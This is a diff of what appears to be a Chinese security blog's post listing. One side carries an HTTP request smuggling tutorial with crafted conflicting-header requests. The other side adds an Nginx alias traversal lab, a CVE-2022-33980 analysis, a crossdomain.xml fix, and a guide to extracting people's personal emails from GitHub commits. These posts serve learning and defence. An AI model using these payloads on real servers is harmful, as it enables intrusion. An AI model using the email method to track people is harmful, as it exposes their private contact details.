-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>demo.com\r\n</span><br></pre></td></tr></table></figure>
+<h2><span id="requirements">Requirements</span></h2><blockquote>
+<p>Github 账号</p>
+<p>你要找的人的 GitHub 账号（需要其账号下有仓库）</p>
+</blockquote>
+<h2><span id="原理">原理</span></h2><blockquote>
+<p>在我们使用 Git 进行版本控制时，一开始，我们会被要求设置一个 Git 的用户名和邮箱，就像下面这样。</p>
+<p><img src="/2023/09/03/Github-Find-Email/1.png" alt="image"></p>
+<p>后续，我们的每一个 Commit 都会基于我们填写的用户名和邮箱来进行存储。我们只需要查询一个人在 Github 的提交记录，就可以找到他填写在 Git 中的邮箱和名字，从而方便我们更进一步找到这个人。</p>
+</blockquote>
+<h2><span id="实践">实践</span></h2><blockquote>
+<p>想要通过 Git 找到一个人的邮箱，最简单的方法就是使用 Github 提供的 GraphQL 来进行查询，简单方便。</p>
+<p>访问Github 的 GraphQL API Explorer，点击右侧的 Sign in ，使用你的 Github 账号登陆，这样就可以调用 Github 的 API 了。</p>
+<p><img src="/2023/09/03/Github-Find-Email/2.png" alt="image"></p>
+<p>登陆后，你下方的 GraphQL 输入框就可以输入内容了。在其中输入如下代码</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  repository(name: <span class="string">&quot;grank&quot;</span>, owner: <span class="string">&quot;lctt&quot;</span>) &#123;</span><br><span class="line">    ref(qualifiedName: <span class="string">&quot;master&quot;</span>) &#123;</span><br><span class="line">      target &#123;</span><br><span class="line">        ... on Commit &#123;</span><br><span class="line">          id</span><br><span class="line">          <span class="title function_">history</span><span class="params">(first: <span class="number">5</span>)</span> &#123;</span><br><span class="line">            edges &#123;</span><br><span class="line">              node &#123;</span><br><span class="line">                author &#123;</span><br><span class="line">                  name</span><br><span class="line">                  email</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <blockquote>
-<p>第二个请求：</p>
-</blockquote>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /secret HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>demo.com\r\n</span><br></pre></td></tr></table></figure>
-
-<h3><span id="cl-cl漏洞">CL-CL漏洞</span></h3><blockquote>
-<p>RFC7230规范：在RFC7230的第3.3.3节中的第四条中，规定当服务器收到的请求中包含两个Content-Length，而且两者的值不同时，需要返回400错误。<br>构造请求：</p>
-</blockquote>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>demo.com\r\n</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5\r\n</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>6\r\n</span><br><span class="line">\r\n</span><br><span class="line">12345\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>得到响应，返回400 Bad Request<br><img src="/2023/06/27/HTTP-request-smuggling-vulnerability/1.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>触发过程：但是总有服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误，但是中间代理服务器按照第一个Content-Length的值对请求进行处理，而后端源站服务器按照第二个Content-Length的值进行处理。</p>
-</blockquote>
-<h3><span id="cl-te漏洞">CL-TE漏洞</span></h3><blockquote>
-<p>CL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理Content-Length请求头，而后端服务器会遵守RFC2616的规定，忽略掉Content-Length，处理Transfer-Encoding请求头。<br><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">CL.TE实验环境</a></p>
-</blockquote>
-<h3><span id="te-te漏洞">TE-TE漏洞</span></h3><blockquote>
-<p>在这里，前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理。<br>详见 RFC7230 section 3.3.3.3</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">If a Transfer-Encoding header field is present in a response and</span><br><span class="line">the chunked transfer coding is not the final encoding, the</span><br><span class="line">message body length is determined by reading the connection until</span><br><span class="line">it is closed by the server.  If a Transfer-Encoding header field</span><br><span class="line">is present in a request and the chunked transfer coding is not</span><br><span class="line">the final encoding, the message body length cannot be determined</span><br><span class="line">reliably; the server MUST respond with the 400 (Bad Request)</span><br><span class="line">status code and then close the connection.</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>这里列出七种混淆方式:</p>
-</blockquote>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">X</span><span class="punctuation">: </span>X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>之所以在处理这些请求头时会出现问题，是因为在实际的HTTP协议实现中，很少有代码精确的遵循了其中的规范，以此导致面对变形的请求头时会出现不同的处理方式。<br><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header">TE.CL实验环境</a></p>
-</blockquote>
-<h3><span id="te-cl漏洞">TE-CL漏洞</span></h3><blockquote>
-<p>所谓TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理Transfer-Encoding这一请求头，而后端服务器处理Content-Length请求头。<br><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">TE.CL验环境</a></p>
-</blockquote>
-<h2><span id="绕过前端服务器安全控制">绕过前端服务器安全控制</span></h2><h3><span id="利用cl-te漏洞绕过">利用CL-TE漏洞绕过</span></h3><blockquote>
-<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">CL.TE实验环境</a></p>
-</blockquote>
-<h3><span id="利用te-cl漏洞绕过">利用TE-CL漏洞绕过</span></h3><blockquote>
-<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">TE.CL实验环境</a></p>
-</blockquote>
-<h2><span id="漏洞防御">漏洞防御</span></h2><blockquote>
-<p>在前端服务器通过同一网络连接将多个请求转发到后端服务器的情况下，会出现HTTP请求走私漏洞，并且后端连接所使用的协议会带来两个服务器不同意边界的风险。要求。防止HTTP请求走私漏洞的一些通用方法如下：</p>
-<ul>
-<li>禁用后端连接的重用，以便每个后端请求通过单独的网络连接发送。</li>
-<li>使用HTTP &#x2F; 2进行后端连接，因为此协议可防止对请求之间的边界产生歧义。</li>
-<li>前端服务器和后端服务器使用完全相同的Web服务器软件，以便它们就请求之间的界限达成一致。<br>在某些情况下，可以通过使前端服务器规范歧义请求或使后端服务器拒绝歧义请求并关闭网络连接来避免漏洞。但是，这些方法比上面确定的通用缓解措施更容易出错。</li>
-</ul>
-</blockquote>
-<h2><span id="参考文章">参考文章</span></h2><blockquote>
-<p>(<a target="_blank" rel="noopener" href="https://paper.seebug.org/1048">https://paper.seebug.org/1048</a>)<br>(<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling">https://portswigger.net/web-security/request-smuggling</a>)<br>(<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/exploiting">https://portswigger.net/web-security/request-smuggling/exploiting</a>)</p>
+<p>并将 name 替换为你要查询的人的 repo 名，owner 改为你需要查询的人的名字，然后点击执行按钮。</p>
+<p><img src="/2023/09/03/Github-Find-Email/3.png" alt="image"></p>
+<p>右侧会出现你的执行结果，你会发现，其中出现我们想要的“邮箱”地址。</p>
+<p><img src="/2023/09/03/Github-Find-Email/4.png" alt="image"></p>
+<p>你会发现，这里其实有两种类型的邮箱，一种是我们常见的，自己用的各种免费邮箱，比如 @qq.com、@gmail.com、@foxmail.com 之类的；另一种是形如 27856297+dependabot-preview[bot]@users.noreply.github.com 这样的邮箱。</p>
+<p>这两种邮箱的区别是，前者是我们自己通过 git 设置的邮箱，而后者则是我们通过 Github 网页、 API 操作产生的 commit 。你在查询的时候，要记得去找第一类邮箱来作为参考。</p>
+<p>当然，不排除有开发者在看了本篇文章后，去用 private 邮箱修改自己本地的 Git ，那就没办法了。</p>
+<p>找到这个邮箱以后怎么办呢？</p>
+<p>直接发邮件联系<br>如果是 QQ 邮箱、 Foxmail ，可以试着直接用邮箱，或者邮箱里的 QQ 号加好友。<br>通过 Google 搜索这个邮箱，查找其他的关联信息。</p>
 </blockquote>
 
 
@@ -380,7 +238,7 @@
 
         
             <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/HTTP/" rel="tag">HTTP</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+                <a class="tag-none-link" href="/tags/Github/" rel="tag">Github</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
             </div>
         
 
@@ -391,30 +249,45 @@
 
     
         <h2 class="title">
-            <a href="/2023/06/27/Email-bounce-spoof-attack/">
-                电子邮件退信攻击
+            <a href="/2023/09/03/Nginx-Alias/">
+                Nginx错误配置alias导致目录遍历漏洞
             </a>
         </h2>
     
     <time>
-        Jun 27, 2023
+        Sep 3, 2023
     </time>
     <section class="content">
-        <h1><span id="电子邮件退信攻击">电子邮件退信攻击</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="http://security.zhiding.cn/security_zone/2010/1225/1974371.shtml">zdnet</a> 并作补充</p>
+        <h1><span id="nginx错误配置alias导致目录遍历漏洞">Nginx错误配置alias导致目录遍历漏洞</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blackwolfsec.cc/2018/05/23/Nginx_alias_misconfig_path_traversle/">BlackWolf</a> 并作补充</p>
 </blockquote>
-<h2><span id="杂记">杂记</span></h2><blockquote>
-<p>有生活常识的朋友都知道，当我们寄出一封信件的时候，如果收信人的地址变更或一些特殊原因。你所寄出的信件将会被原址退回。实际上电子邮件也是有这个退信功能的。不过这个便利的功能却被网络黑客发现并加以利用，邮件退信攻击有成为了危害邮件安全的一个难题。</p>
-<p>所谓邮件退信攻击，是将预攻击的对象伪造成发件人地址，而收件人设置为一系列其他邮件域并不存在的账号，这样当邮件大量发送，例如通过僵尸网络，由于收件人不存在，邮件系统将产生大量的退信给发件人地址。该发件人地址所属的真实服务器将收到大量的退信，增加服务器的负荷，也容易使该公司的邮件服务器被列入黑名单。</p>
-<p>邮件退信攻击在程度上有所区别，上面介绍的这种攻击，被攻击者可能一天之内收到数百上千封各种退信。一般用户碰到的邮件退信攻击属于骚扰性质，垃圾邮件发送者在发送垃圾邮件时，常常随机的设置发件人，例如其中包括<a href="mailto:&#98;&#x6f;&#x62;&#x6f;&#64;&#97;&#98;&#x63;&#46;&#x63;&#111;&#x6d;">&#98;&#x6f;&#x62;&#x6f;&#64;&#97;&#98;&#x63;&#46;&#x63;&#111;&#x6d;</a>，当大量发送垃圾邮件时，有些邮件可能是以<a href="mailto:&#98;&#111;&#x62;&#111;&#64;&#x61;&#x62;&#x63;&#x2e;&#x63;&#111;&#109;">&#98;&#111;&#x62;&#111;&#64;&#x61;&#x62;&#x63;&#x2e;&#x63;&#111;&#109;</a>发送的，则bobo就可能收到退信，有时一天只有几封或几十封，但总是不断，让人十分郁闷。</p>
-<p>退信信息通常比较有规律，例如发件人为空，或者为<a href="mailto:&#x4d;&#x41;&#73;&#76;&#x45;&#82;&#x2d;&#x44;&#65;&#x45;&#x4d;&#x4f;&#78;&#64;&#x78;&#120;&#x78;&#46;&#x63;&#x6f;&#109;">&#x4d;&#x41;&#73;&#76;&#x45;&#82;&#x2d;&#x44;&#65;&#x45;&#x4d;&#x4f;&#78;&#64;&#x78;&#120;&#x78;&#46;&#x63;&#x6f;&#109;</a>，主题一般为Undelivered Mail Returned等。有些用户采用关键字的技术将退信予以阻断，或者干脆限定阻止空发件人，但是这经常会把正常的退信也阻止掉，导致信息不畅。</p>
-<p>一般而言，退信占一个公司的邮件量5%以上，这其中绝大部分是垃圾退信。如何防止收到这种垃圾退信，避免邮件退信攻击呢?</p>
-<p>采用SPF或domain-key的技术。这两种技术的原理相似。例如sohu.com的SPF记录是sohu.com text &#x3D; “v&#x3D;spf1 ip4:61.135.130.0&#x2F;23 ip4:61.135.132.0&#x2F;23 (。。。sohu邮件服务器所属IP)all”;如果有人冒用sohu发送垃圾邮件，收件方如果采用了SPF过滤技术，就能判定这是假冒的垃圾邮件，将不会给sohu发送DNR了。</p>
-<p>遗憾的是很多服务器不做SPF验证，因此即使您的公司设置了SPF记录，也不能阻止垃圾退信。</p>
+<h2><span id="0x00-前言">0x00 前言</span></h2><blockquote>
+<p>nginx错误配置alias，导致存在目录遍历，可跳出限制读取上一层目录及其任意子目录的文件的任意文件。</p>
 </blockquote>
-<h2><span id="重点">重点</span></h2><blockquote>
-<p>此文其实是为了记念一下一个工具：<a target="_blank" rel="noopener" href="http://www.jetmore.org/john/code/swaks/">Swaks</a> </p>
-<p>几乎绝大部分的邮件攻击都可以由它进行实践，之前测试其实很多现在大厂的消费级邮箱是有或多或少的问题的。</p>
+<h2><span id="0x01-环境搭建">0x01 环境搭建</span></h2><blockquote>
+<p>使用richarvey&#x2F;nginx-php-fpm镜像</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80:80  richarvey/nginx-php-fpm</span><br></pre></td></tr></table></figure>
+
+<p>配置nginx，添加配置test路由解析到&#x2F;var&#x2F;www&#x2F;html&#x2F;路径（注意：&#x2F;test没有结尾的&#x2F;）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># /etc/nginx/sites-available/default.conf</span><br><span class="line">location /test &#123;</span><br><span class="line">        alias /var/www/html/;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>对应Web服务的文件结构，目标是目录遍历获取flag.txt的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">|--var</span><br><span class="line">   |--www</span><br><span class="line">      |--flag.txt</span><br><span class="line">      |--html</span><br><span class="line">         |--index.php</span><br><span class="line">         |--test.txt</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="0x02-漏洞利用">0x02 漏洞利用</span></h2><blockquote>
+<p>通过访问<a target="_blank" rel="noopener" href="http://127.0.0.1/test/test.txt">http://127.0.0.1/test/test.txt</a></p>
+<p>可以成功访问到test的内容如下(&#x2F;test&#x2F;test.txt路由请求，经处理后转换成：&#x2F;var&#x2F;www&#x2F;html&#x2F;test.txt)：</p>
+<p><code>this is a test</code></p>
+<p>修改请求为<a target="_blank" rel="noopener" href="http://127.0.0.1/test../flag.txt%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%88%90%E5%8A%9F%E8%B7%B3%E5%88%B0%E4%B8%8A%E4%B8%80%E5%B1%82%E7%9B%AE%E5%BD%95%E4%B8%8B%EF%BC%8C%E8%AF%BB%E5%8F%96%E5%88%B0flag.txt%E7%9A%84%E5%86%85%E5%AE%B9(%60/test../flag.txt%60%E8%B7%AF%E7%94%B1%E8%AF%B7%E6%B1%82%EF%BC%8C%E7%BB%8F%E5%A4%84%E7%90%86%E5%90%8E%E8%BD%AC%E6%8D%A2%E6%88%90%EF%BC%9A%60/var/www/flag.txt%60)">http://127.0.0.1/test../flag.txt，可以成功跳到上一层目录下，读取到flag.txt的内容(`/test../flag.txt`路由请求，经处理后转换成：`/var/www/flag.txt`)</a></p>
+<p><code>you get me, hahaha</code></p>
+</blockquote>
+<h2><span id="0x03-小结">0x03 小结</span></h2><blockquote>
+<p>只能跳到上一层目录，读取上一层目录及其任意子目录的文件，不能任意目录遍历读取任意文件,有局限性。</p>
+<p>需要nginx配置缺陷，实战情况比较有限，但是真实存在（如：参考链接3）。</p>
+<p>一种场景是：很多网站会把备份文件放置在网页目录的上一层路径下，利用遍历读取备份文件；另一种场景是：路由限制到上传或静态图片路径，利用遍历读取上一层路径下的配置文件等。</p>
+</blockquote>
+<h2><span id="0x04-参考链接">0x04 参考链接</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md">https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md</a><br><a target="_blank" rel="noopener" href="https://hackerone.com/reports/317201">https://hackerone.com/reports/317201</a><br><a target="_blank" rel="noopener" href="https://hackerone.com/reports/312510">https://hackerone.com/reports/312510</a></p>
 </blockquote>
 
 
@@ -422,7 +295,7 @@
 
         
             <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Nginx/" rel="tag">Nginx</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
             </div>
         
 
@@ -433,43 +306,348 @@
 
     
         <h2 class="title">
-            <a href="/2022/08/25/Slowhttptest-Usage/">
-                Slowhttptest Usage
+            <a href="/2023/09/03/Crossdomain-XML/">
+                怎么把网站crossdomain.xml配置风险去除
             </a>
         </h2>
     
     <time>
-        Aug 25, 2022
+        Sep 3, 2023
     </time>
     <section class="content">
-        <h1><span id="slowhttptest-对-slow-http-dos-的误判">Slowhttptest 对 Slow HTTP Dos 的误判</span></h1><h2><span id="当场滑跪">当场滑跪</span></h2><blockquote>
-<p>前段时间在巡检公司项目的时候发现了<a href="https://szczecin.github.io/2022/08/08/Slow-HTTP-Dos/">HTTP慢速拒绝服务攻击（Slow HTTP Dos）</a><br>于是就下发让项目运维去修复了，但是反馈说明明配置了正确的参数，于是我当（zhi）场（jie）滑（dao）跪（qian） ORZ</p>
-<p><img src="/2022/08/25/Slowhttptest-Usage/1.jpg" alt="image"></p>
+        <h1><span id="怎么把网站crossdomainxml配置风险去除">怎么把网站crossdomain.xml配置风险去除</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://codeantenna.com/a/AoJYq0YYQe">nanjingbolg</a> 并作补充</p>
 </blockquote>
-<h2><span id="发生了什么">发生了什么</span></h2><blockquote>
-<p>所以是发生了什么？漏扫就那么垃圾和我过不去这么多误报？我还好好用 slowhttptest 去验证了，确实存在<code>service available:   NO</code>的显示，图就不发了，拿阿B的给你们看看：<br><img src="/2022/08/25/Slowhttptest-Usage/1.png" alt="image"></p>
-<p>后来看得多了我发现（其实早就发现了），slowhttptest 的<code>slowbody</code>模式下很容易出现<code>service available:   NO</code>，<code>read</code>和<code>header</code>就很容易通过测试<br>但是归根到底是否触发拒绝服务，肯定看：</p>
-<ul>
-<li><ol>
-<li>网站载入延时</li>
-</ol>
-</li>
-<li><ol start="2">
-<li>网站是否还可访问</li>
-</ol>
-</li>
-</ul>
-<p>在看了<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41901122/article/details/114143913">星球守护者</a> 的漏洞复现后我发现，用 slowhttptest 验证 Slow HTTP Dos 真实存在，需要注意：</p>
+<blockquote>
+<p>打开程序目录下的crossdomain.xml文件，确保配置只对提供安全资源的可信域开放：</p>
+<p>源代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=”1.0″?&gt;&lt;!DOCTYPE cross-domain-policy SYSTEM ”http://www.macromedia.com/xml/dtds/cross-domain-policy.dtd”&gt;&lt;cross-domain-policy&gt;&lt;allow-access-from domain=”*” /&gt;&lt;/cross-domain-policy&gt;</span><br></pre></td></tr></table></figure>
+
+<p>文件中的allow-access-from 实体设置为星号设置为允许任何域访问，将其修改为:</p>
+<p><code>&lt;allow-access-from domain=”*.17showshow.com” /&gt;</code></p>
+<p>*.17showshow.com 换为您自己的域名(注意是一级域名)。</p>
+<p>表示只允许本域访问，该问题就解决了。</p>
 </blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. slow HTTP test status on Xth second:		X 数字较小，即较早就开始拒绝服务</span><br><span class="line">2. service available:   NO</span><br><span class="line">3. Test ended on X+1th second</span><br><span class="line">4. Exit status: Connection refused		这两点比较重要，真的拒绝服务了直接下一秒就停止测试了</span><br></pre></td></tr></table></figure>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/XML/" rel="tag">XML</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/03/CVE-2022-33980-Apache-Commons/">
+                关于CVE-2022-33980 Apache Commons Configuration 远程命令执行漏洞分析
+            </a>
+        </h2>
+    
+    <time>
+        Sep 3, 2023
+    </time>
+    <section class="content">
+        <h1><span id="关于cve-2022-33980-apache-commons-configuration-远程命令执行漏洞分析">关于CVE-2022-33980 Apache Commons Configuration 远程命令执行漏洞分析</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/543936119">星阑科技</a> 并作补充</p>
+</blockquote>
+<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
+<p>7月6日，Apache官方发布安全公告，修复了一个存在于Apache Commons Configuration 组件的远程代码执行漏洞，漏洞编号：CVE-2022-33980，漏洞威胁等级：高危。恶意攻击者通过该漏洞，可在目标服务器上实现任意代码执行。</p>
+</blockquote>
+<h2><span id="相关介绍">相关介绍</span></h2><blockquote>
+<p>Apache Commons Configuration是一个Java应用程序的配置管理工具，可以从properties或者xml文件中加载软件的配置信息，用来构建支撑软件运行的基础环境。在一些配置文件较多较复杂的情况下，使用该配置工具比较可以简化配置文件的解析和管理，提高开发效率和软件的可维护性。</p>
+</blockquote>
+<h2><span id="利用范围">利用范围</span></h2><blockquote>
+<p>2.4 &lt;&#x3D; Apache Commons Configuration &lt;&#x3D;2.7</p>
+</blockquote>
+<h2><span id="前置知识">前置知识</span></h2><blockquote>
+<p>什么是变量插值？</p>
+<p>通常我们用apach的configuration2库来管理配置文件(org.apache.commons:commons-configuration2),在commons-configuration2管理的配置文件中，配置变量的值可以引用变量。举个例子：${env:xxhzz}就指代环境变量xxhzz，在commons-configuration2中这种引用动态变量的方式就叫变量插值。</p>
+<p>变量插值解析：在commons-configuration2中，负责对字符串中的变量进行解析的是org.apache.commons.configuration2.interpol.ConfigurationInterpolator类中的interpolate(Object)方法。</p>
+</blockquote>
+<h2><span id="漏洞原理">漏洞原理</span></h2><blockquote>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/1.png" alt="image"></p>
+<p>从漏洞通告中，可以得知Apache Commons Configuration执行变量插值，允许动态评估和扩展属性。插值的标准格式是“${prefix:name}”，其中“prefix”用于定位执行插值的org.apache.commons.configuration2.interpol.Lookup 实例。</p>
+<p>从2.4版到2.7版，默认的Lookup实例集包括可能导致任意代码执行或与远程服务器联系的插值器。如公告中提到“script” 可使用JVM脚本执行引擎(javax.script)执行表达式，若使用了不受信任的配置值，在受影响的版本中使用插值默认值的应用程序就很可能受到远程代码执行的影响。</p>
+</blockquote>
+<h2><span id="环境搭建">环境搭建</span></h2><blockquote>
+<p>了解了漏洞原理后，为更好理解漏洞的形成，需构建一个调试的demo环境。</p>
+<p>通过maven直接引入Apache Commons Configuration2.7。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/2.png" alt="image"></p>
+<p>接着构建一个触发漏洞的主类即可</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/3.png" alt="image"></p>
+</blockquote>
+<h2><span id="动态调式">动态调式</span></h2><blockquote>
+<p>在对插值变量进行解析的地方打下断点。</p>
+<p>org.apache.commons.configuration2.interpol.ConfigurationInterpolator#interpolate</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/4.png" alt="image"></p>
+<p>开启debug模式，在经过了前两个if判断之后，随后会进入resolveSingleVariable函数。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/5.png" alt="image"></p>
+<p>在org.apache.commons.configuration2.interpol.ConfigurationInterpolator#resolveSingleVariable中首先跟一下extractVariableName函数。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/6.png" alt="image"></p>
+<p>org.apache.commons.configuration2.interpol.ConfigurationInterpolator#extractVariableName的作用是提取变量字符串strValue。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/7.png" alt="image"></p>
+<p>随后进入org.apache.commons.configuration2.interpol.ConfigurationInterpolator#resolve函数中，通过index0f查找和判断条件，从变量字符串中分别获取到prefix和name。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/8.png" alt="image"></p>
+<p>继续跟进会进入lookup函数。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/9.png" alt="image"></p>
+<p>在分析lookup函数前先跟进下fetchLookupForPrefix函数。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/10.png" alt="image"></p>
+<p>fetchLookupForPrefix函数的作用是获取到stringLookup对象。</p>
+<p>继续跟进，会进入commons-text-1.8.jar包中的org.apache.commons.text.lookup.ScriptStringLookup#lookup函数。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/11.png" alt="image"></p>
+<p>在org.apache.commons.text.lookup.ScriptStringLookup#lookup函数中会再次对字符串进行分割，分别提取engineName和script。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/12.png" alt="image"></p>
+<p>接着会通过getEngineByName函数获取ScriptEngine（javax.script)。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/13.png" alt="image"></p>
+<p>继续往下，出现eval函数。而我们知道eval函数可计算某个字符串，并执行其中的的JavaScript 代码。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/14.png" alt="image"></p>
+<p>继续往下将成功触发我们传入的payload，造成远程命令执行。</p>
+</blockquote>
+<h2><span id="漏洞复现">漏洞复现</span></h2><blockquote>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/15.png" alt="image"></p>
+<p>​成功命令执行。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/16.png" alt="image"></p>
+</blockquote>
+<h2><span id="修复建议">修复建议</span></h2><blockquote>
+<p>目前官方已发布修复版本修复了该漏洞，请受影响的用户升级到 Apache Commons Configuration 2.8.0 版本。<br><a target="_blank" rel="noopener" href="https://commons.apache.org/proper/commons-configuration/download_configuration.cgi">https://commons.apache.org/proper/commons-configuration/download_configuration.cgi</a></p>
+</blockquote>
+<h2><span id="参考材料">参考材料</span></h2><blockquote>
